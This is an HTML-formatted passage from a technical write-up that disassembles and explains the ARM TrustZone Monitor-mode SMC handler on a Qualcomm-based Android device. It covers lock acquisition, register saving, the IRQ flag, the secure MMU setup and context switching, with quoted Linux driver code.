&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D0F8&lt;/span&gt;                 &lt;span class="no"&gt;STREXEQ&lt;/span&gt;         &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="c1"&gt;; if not locked, try to lock TrustZone&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D0FC&lt;/span&gt;                 &lt;span class="no"&gt;CMPEQ&lt;/span&gt;           &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0  ; test if TrustZone is now locked&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D100&lt;/span&gt;                 &lt;span class="no"&gt;BNE&lt;/span&gt;             &lt;span class="no"&gt;loc_FE80D0F0&lt;/span&gt; &lt;span class="c1"&gt;; retry if TrustZone is still not locked&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D104&lt;/span&gt;                 &lt;span class="no"&gt;DMB&lt;/span&gt;             &lt;span class="no"&gt;SY&lt;/span&gt;      &lt;span class="c1"&gt;; Data Memory Barrier acts as a memory barrier&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Then, it tries to acquire the TrustZone lock. This implementation
is very similar to the example provided in &lt;a href=
"http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.ddi0406c/index.html"&gt;
ARM Ref.&lt;/a&gt; (D7.3.1 Acquiring a lock).&lt;/p&gt;
&lt;p&gt;It relies on synchronization primitives (LDREX/STREX) to support
exclusive accesses to memory shared between cores.
Once the lock is acquired, the current core is the only one running
in TrustZone, and the execution can continue.&lt;/p&gt;
&lt;h5&gt;IV.3.A.d Pre-exception status&lt;/h5&gt;

&lt;p&gt;LR_mon and SPSR_mon are both banked registers. Their values are
generated by the exception entry. LR_mon contains the return
address in Non-Secure world (right after the SMC instruction). The
purpose of SPSR_mon is to record the pre-exception value of the
CPSR.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D108&lt;/span&gt;                 &lt;span class="no"&gt;LDR&lt;/span&gt;             &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="no"&gt;NS_core_status&lt;/span&gt; &lt;span class="c1"&gt;; secure area to store Non-Secure (NS) status&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D10C&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;LR&lt;/span&gt;  &lt;span class="c1"&gt;; read NS return address (LR_mon)&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D110&lt;/span&gt;                 &lt;span class="no"&gt;MRS&lt;/span&gt;             &lt;span class="no"&gt;R2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;SPSR&lt;/span&gt; &lt;span class="c1"&gt;; read NS CPSR (SPSR_mon)&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D114&lt;/span&gt;                 &lt;span class="no"&gt;STMIA&lt;/span&gt;           &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;R2&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt; &lt;span class="c1"&gt;; write LR_mon &amp;amp; SPSR_mon&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;These two registers are saved in Secure memory to be restored later on exception return.&lt;/p&gt;
&lt;h5&gt;IV.3.A.e IRQ interruption flag&lt;/h5&gt;

&lt;p&gt;Then a DWORD at a static address is unconditionally cleared:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D118&lt;/span&gt;                 &lt;span class="no"&gt;LDR&lt;/span&gt;             &lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="no"&gt;tz_irq_interrupted&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D11C&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D120&lt;/span&gt;                 &lt;span class="no"&gt;STR&lt;/span&gt;             &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;R1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="c1"&gt;; clear tz_irq_interrupted value&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;By looking at cross-references, we notice this DWORD is set to 1 in
the IRQ handler of Monitor mode. But in both handlers (SMC &amp;amp; IRQ),
when an exception returns to the Non-Secure world, the returned
value (in R0) is set to 1 if this DWORD is not null.&lt;/p&gt;
&lt;p&gt;Futhermore, we can have a look at how &lt;a href=
"https://android.googlesource.com/kernel/msm/+/android-msm-hammerhead-3.4-kitkat-mr2/arch/arm/mach-msm/scm.c"&gt;
SCM&lt;/a&gt; interprets the value returned by a SMC call:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;#define SCM_INTERRUPTED  1&lt;/span&gt;
&lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;asm&lt;/span&gt; &lt;span class="k"&gt;volatile&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
        &lt;span class="n"&gt;__asmeq&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;%0&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;r0&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;__asmeq&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;%1&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;r0&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;__asmeq&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;%2&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;r1&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;__asmeq&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;%3&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;r2&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="cp"&gt;#ifdef REQUIRES_SEC&lt;/span&gt;
        &lt;span class="s"&gt;&amp;quot;.arch_extension sec&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;
&lt;span class="cp"&gt;#endif&lt;/span&gt;
        &lt;span class="s"&gt;&amp;quot;smc #0 @ switch to secure world&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&lt;/span&gt;
        &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;=r&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;r0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;r&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;r0&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;r&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;r1&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;r&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;r2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;r3&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;r0&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;SCM_INTERRUPTED&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;SCM will reiterate each SMC call while the returned value is 1.&lt;/p&gt;
&lt;p&gt;We can deduce that this DWORD indicates if the exception return is
due to an IRQ interrupt. TrustZone Whitepaper (&lt;a href=
"http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.prd29-genc-009492c/CACCDCDH.html"&gt;3.3.3
Secure interrupts&lt;/a&gt;) says ARM recommends the use of IRQ as a
Normal world interrupt source. That's why IRQ interrupts are
handled in the Normal world.&lt;/p&gt;
&lt;h5&gt;IV.3.A.f Configure Secure world MMU&lt;/h5&gt;

&lt;p&gt;Next block of instructions modifies the translation table of Secure
MMU (&lt;a href=
"http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.ddi0406c/index.html"&gt;ARM
Ref.&lt;/a&gt; B3.1 About the VMSA) if two conditions are met:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D124&lt;/span&gt;                 &lt;span class="no"&gt;MRC&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;5&lt;/span&gt; &lt;span class="c1"&gt;; read MPIDR register&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D128&lt;/span&gt;                 &lt;span class="no"&gt;AND&lt;/span&gt;             &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0xFF ; extract Aff0 from MPIDR&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D12C&lt;/span&gt;                 &lt;span class="no"&gt;CMP&lt;/span&gt;             &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D130&lt;/span&gt;                 &lt;span class="no"&gt;BNE&lt;/span&gt;             &lt;span class="no"&gt;loc_FE80D164&lt;/span&gt; &lt;span class="c1"&gt;; jump if current core != CPU0&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D134&lt;/span&gt;                 &lt;span class="no"&gt;LDR&lt;/span&gt;             &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="no"&gt;tz_ext_elf_loaded&lt;/span&gt; &lt;span class="c1"&gt;; read external ELF status&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D138&lt;/span&gt;                 &lt;span class="no"&gt;LDR&lt;/span&gt;             &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D13C&lt;/span&gt;                 &lt;span class="no"&gt;CMP&lt;/span&gt;             &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="c1"&gt;#0&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D140&lt;/span&gt;                 &lt;span class="no"&gt;BEQ&lt;/span&gt;             &lt;span class="no"&gt;loc_FE80D164&lt;/span&gt; &lt;span class="c1"&gt;; jump if no external ELF loaded&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D144&lt;/span&gt;                 &lt;span class="no"&gt;LDR&lt;/span&gt;             &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="no"&gt;tz_ext_elf_ttbr0&lt;/span&gt; &lt;span class="c1"&gt;; read TTBR0 ptr for external ELF&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D148&lt;/span&gt;                 &lt;span class="no"&gt;LDR&lt;/span&gt;             &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D14C&lt;/span&gt;                 &lt;span class="no"&gt;DSB&lt;/span&gt;             &lt;span class="no"&gt;SY&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D150&lt;/span&gt;                 &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="c1"&gt;; write new TTBR0&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D154&lt;/span&gt;                 &lt;span class="no"&gt;ISB&lt;/span&gt;             &lt;span class="no"&gt;SY&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D158&lt;/span&gt;                 &lt;span class="no"&gt;MCR&lt;/span&gt;             &lt;span class="no"&gt;p15&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;R0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c8&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="no"&gt;c7&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt; &lt;span class="c1"&gt;; flush TLBs&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D15C&lt;/span&gt;                 &lt;span class="no"&gt;DSB&lt;/span&gt;             &lt;span class="no"&gt;SY&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D160&lt;/span&gt;                 &lt;span class="no"&gt;ISB&lt;/span&gt;             &lt;span class="no"&gt;SY&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;First, it checks if the current core is CPU0.&lt;/p&gt;
&lt;p&gt;Then, it checks if a DWORD is not null. By looking at
cross-references, we notice that this DWORD is modified in SCM
handler of QSEOS_LOAD_EXTERNAL_ELF_COMMAND call (not part of the
Monitor code). This SCM call is made by qseecom_load_external_elf()
function in the&amp;nbsp;&lt;a href=
"https://android.googlesource.com/kernel/msm/+/android-msm-hammerhead-3.4-kitkat-mr2/drivers/misc/qseecom.c"&gt;QSEECOM
Linux driver&lt;/a&gt;. This function allows the HLOS to load an external
ELF binary into the Secure World. We can remark that this function
first ensures to run on CPU0.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;static&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;qseecom_load_external_elf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;struct&lt;/span&gt; &lt;span class="n"&gt;qseecom_dev_handle&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="n"&gt;__user&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;argp&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
&lt;span class="p"&gt;[...]&lt;/span&gt;
 &lt;span class="cm"&gt;/* SCM_CALL tied to Core0 */&lt;/span&gt;
 &lt;span class="n"&gt;mask&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;CPU_MASK_CPU0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
 &lt;span class="n"&gt;set_cpu_ret&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;set_cpus_allowed_ptr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;current&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;mask&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;[...]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;You can also refer to TrustZone Whitepaper to learn more about
"&lt;a href=
"http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.prd29-genc-009492c/ch05s04s01.html"&gt;Secure
World processor affinity&lt;/a&gt;" on multiprocessor systems.&lt;/p&gt;
&lt;p&gt;Finally, if those checks are successful, the Translation Table Base
Register 0 (TTBR0) is modified, and data &amp;amp; instruction TLBs are
both flushed. TTBR0 holds the physical address of the first-level
translation table used by the Secure MMU to perform table
translation walks.&lt;/p&gt;
&lt;p&gt;This block of instructions will configure the MMU to create a
dedicated address space in the Secure World if an external ELF is
loaded on CPU0.&lt;/p&gt;
&lt;h5&gt;IV.3.A.g Context switching&lt;/h5&gt;

&lt;p&gt;Before switching to Secure World, Normal World context is saved
into Secure memory (&lt;a href=
"http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.prd29-genc-009492c/ch05s03s01.html"&gt;TrustZone
Whitepaper, 5.3.1 Context switching&lt;/a&gt;). It includes :&lt;br&gt;
&lt;ul&gt;
&lt;li&gt;General purpose registers (R0-R12)&lt;/li&gt;
&lt;li&gt;Banked registers SPSR, SP and LR of each mode IRQ, SVC, ABT,
UND.&lt;/li&gt;
&lt;li&gt;Banked registers SPSR, R8, R9, R10, R11, R12, SP and LR of FIQ
mode.&lt;/li&gt;
&lt;/ul&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D168&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;LR&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;SP&lt;/span&gt;  &lt;span class="c1"&gt;; save Monitor stack address&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D16C&lt;/span&gt;                 &lt;span class="no"&gt;LDR&lt;/span&gt;             &lt;span class="no"&gt;SP&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;=&lt;/span&gt;&lt;span class="no"&gt;NS_core_context&lt;/span&gt; &lt;span class="c1"&gt;; secure area to store Non-Secure context&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D170&lt;/span&gt;                 &lt;span class="no"&gt;STMFD&lt;/span&gt;           &lt;span class="no"&gt;SP&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R0-LR&lt;/span&gt;&lt;span class="err"&gt;}^&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D174&lt;/span&gt;                 &lt;span class="no"&gt;MOV&lt;/span&gt;             &lt;span class="no"&gt;R4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;SP&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D178&lt;/span&gt;                 &lt;span class="no"&gt;CPS&lt;/span&gt;             &lt;span class="c1"&gt;#CPSR_MODE_IRQ ; switch to IRQ mode&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D17C&lt;/span&gt;                 &lt;span class="no"&gt;MRS&lt;/span&gt;             &lt;span class="no"&gt;R12&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;SPSR&lt;/span&gt; &lt;span class="c1"&gt;; read SPSR_irq&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D180&lt;/span&gt;                 &lt;span class="no"&gt;STMIA&lt;/span&gt;           &lt;span class="no"&gt;R4&lt;/span&gt;&lt;span class="p"&gt;!,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R12-LR&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D184&lt;/span&gt;                 &lt;span class="no"&gt;CPS&lt;/span&gt;             &lt;span class="c1"&gt;#CPSR_MODE_SVC ; switch to Supervisor mode&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D188&lt;/span&gt;                 &lt;span class="no"&gt;MRS&lt;/span&gt;             &lt;span class="no"&gt;R12&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;SPSR&lt;/span&gt; &lt;span class="c1"&gt;; read SPSR_svc&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D18C&lt;/span&gt;                 &lt;span class="no"&gt;STMIA&lt;/span&gt;           &lt;span class="no"&gt;R4&lt;/span&gt;&lt;span class="p"&gt;!,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R12-LR&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D190&lt;/span&gt;                 &lt;span class="no"&gt;CPS&lt;/span&gt;             &lt;span class="c1"&gt;#CPSR_MODE_ABT ; switch to Abort mode&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D194&lt;/span&gt;                 &lt;span class="no"&gt;MRS&lt;/span&gt;             &lt;span class="no"&gt;R12&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;SPSR&lt;/span&gt; &lt;span class="c1"&gt;; read SPSR_abt&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D198&lt;/span&gt;                 &lt;span class="no"&gt;STMIA&lt;/span&gt;           &lt;span class="no"&gt;R4&lt;/span&gt;&lt;span class="p"&gt;!,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R12-LR&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D19C&lt;/span&gt;                 &lt;span class="no"&gt;CPS&lt;/span&gt;             &lt;span class="c1"&gt;#CPSR_MODE_UND ; switch to Undefined mode&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D1A0&lt;/span&gt;                 &lt;span class="no"&gt;MRS&lt;/span&gt;             &lt;span class="no"&gt;R12&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;SPSR&lt;/span&gt; &lt;span class="c1"&gt;; read SPSR_und&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D1A4&lt;/span&gt;                 &lt;span class="no"&gt;STMIA&lt;/span&gt;           &lt;span class="no"&gt;R4&lt;/span&gt;&lt;span class="p"&gt;!,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R12-LR&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D1A8&lt;/span&gt;                 &lt;span class="no"&gt;CPS&lt;/span&gt;             &lt;span class="c1"&gt;#CPSR_MODE_FIQ ; switch to FIQ mode&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D1AC&lt;/span&gt;                 &lt;span class="no"&gt;MRS&lt;/span&gt;             &lt;span class="no"&gt;R7&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="no"&gt;SPSR&lt;/span&gt; &lt;span class="c1"&gt;; read SPSR_fiq&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D1B0&lt;/span&gt;                 &lt;span class="no"&gt;STMIA&lt;/span&gt;           &lt;span class="no"&gt;R4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="err"&gt;{&lt;/span&gt;&lt;span class="no"&gt;R7-LR&lt;/span&gt;&lt;span class="err"&gt;}&lt;/span&gt;
&lt;span class="nl"&gt;LOAD:&lt;/span&gt;&lt;span class="nf"&gt;FE80D1B4&lt;/span&gt;                 &lt;span class="no"&gt;CPS&lt;/span&gt;             &lt;span class="c1"&gt;#CPSR_MODE_MON ; switch back to Monitor mode&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Because the current security state is Secure (SCR.NS == 0), CPS
instructions can be used to switch to each mode before finally
switching back to Monitor mode. MRS instruction reads a Special
Register (like SPSR) and writes it to a general purpose register.&lt;/p&gt;
&lt;p&gt;Later, this saved context will be restored when the processor
switches back to the Normal World.&lt;/p&gt;
&lt;p&gt;Then, Secure World context is restored from a previous context
switch (Secure to Normal World).&lt;/p&gt;
